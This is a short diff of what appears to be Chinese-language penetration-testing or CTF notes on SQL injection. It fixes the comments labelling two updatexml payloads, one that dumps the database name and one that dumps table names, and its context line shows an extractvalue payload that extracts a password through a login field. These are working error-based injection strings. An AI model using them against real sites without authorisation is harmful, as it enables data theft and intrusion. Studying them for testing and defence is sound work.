@@ -89,8 +89,8 @@ username=44&password=1%27^extractvalue(1,concat(0x7e,(select(left(password,30))f
 用UPDATEXML进行注入
 
 ```
-id=-1' and updatexml(1,concat(0x7e,database(),0x7e),1)%23 //爆表名
-id=-1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23
+id=-1' and updatexml(1,concat(0x7e,database(),0x7e),1)%23 //爆库名
+id=-1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23  //爆表名
 ```
 
 * ### SQLMAP
